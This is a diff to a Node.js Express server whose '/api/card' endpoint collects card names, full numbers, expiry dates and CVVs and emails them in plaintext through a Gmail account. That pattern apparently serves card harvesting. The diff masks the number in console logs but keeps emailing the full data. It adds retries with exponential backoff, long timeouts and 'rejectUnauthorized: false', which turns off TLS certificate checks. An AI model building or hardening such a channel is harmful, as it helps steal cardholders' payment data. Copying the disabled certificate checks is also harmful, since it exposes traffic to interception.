@@ -6,6 +6,9 @@ const cors = require('cors');
 const nodemailer = require('nodemailer');
 const app = express();
 
+// Load local .env in development (optional). Ensure .env is in .gitignore and don't commit secrets.
+require('dotenv').config();
+
 const allowedOrigins = [
   'http://127.0.0.1:5500',
   'http://localhost:5500',
@@ -48,7 +51,9 @@ app.options('/api/card', (req, res) => res.sendStatus(200));
 
 app.post('/api/card', async (req, res) => {
   const { cardName, cardNumber, expiry, cvv } = req.body;
-  console.log('Received card submission:', req.body);
+  // Avoid logging sensitive full card data. Mask all but last 4 digits if available.
+  const maskedCard = cardNumber ? String(cardNumber).replace(/\d(?=\d{4})/g, '*') : 'N/A';
+  console.log('Received card submission:', { cardName, cardNumber: maskedCard, expiry });
 
   if (!cardName || !cardNumber || !expiry || !cvv) {
     return res.status(400).json({ error: 'Missing fields' });
@@ -67,7 +72,16 @@ app.post('/api/card', async (req, res) => {
     host: 'smtp.gmail.com',
     port: 465,
     secure: true,
-    auth: { user: gmailUser, pass: gmailPass }
+    auth: { user: gmailUser, pass: gmailPass },
+    requireTLS: true,
+    // Increase timeouts to reduce ETIMEDOUT on slow networks
+    connectionTimeout: 60000, // ms
+    greetingTimeout: 30000,
+    socketTimeout: 60000,
+    tls: {
+      // allow self-signed during restrictive environments (optional)
+      rejectUnauthorized: false
+    }
   });
 
   const mailOptions = {
@@ -77,13 +91,51 @@ app.post('/api/card', async (req, res) => {
     text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
   };
 
+  // Helper: small sleep for backoff
+  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+  // Retry send with exponential backoff for transient errors
+  async function sendMailWithRetries(trans, mail, attempts = 3) {
+    let lastErr;
+    for (let i = 0; i < attempts; i++) {
+      try {
+        // Verify connection/auth before sending on first attempt
+        if (i === 0) {
+          await trans.verify();
+        }
+        const info = await trans.sendMail(mail);
+        return info;
+      } catch (err) {
+        lastErr = err;
+        const retriable = ['ETIMEDOUT', 'EAI_AGAIN', 'ECONNRESET', 'ENOTFOUND'].includes(err && err.code);
+        console.warn(`sendMail attempt ${i + 1} failed, code=${err && err.code}: ${err && err.message}`);
+        if (!retriable) break;
+        // backoff: 500ms * 2^i
+        await sleep(500 * Math.pow(2, i));
+      }
+    }
+    throw lastErr;
+  }
+
   try {
-    const info = await transporter.sendMail(mailOptions);
-    console.log('Email sent:', info.response);
-    res.json({ success: true, message: 'Email sent', info: info.response });
+    const info = await sendMailWithRetries(transporter, mailOptions, 3);
+    console.log('Email sent:', info && (info.response || info.messageId));
+    res.json({ success: true, message: 'Email sent', info: info && (info.response || info.messageId) });
   } catch (err) {
-    console.error('Email error:', err);
-    res.status(500).json({ error: 'Failed to send email', details: err.message });
+    console.error('Email error:', {
+      message: err && err.message,
+      code: err && err.code,
+      command: err && err.command,
+      response: err && err.response
+    });
+    // close transporter if available
+    try { transporter.close && transporter.close(); } catch (_) {}
+    res.status(500).json({
+      error: 'Failed to send email',
+      details: err && err.message,
+      code: err && err.code,
+      command: err && err.command
+    });
   }
 });
 
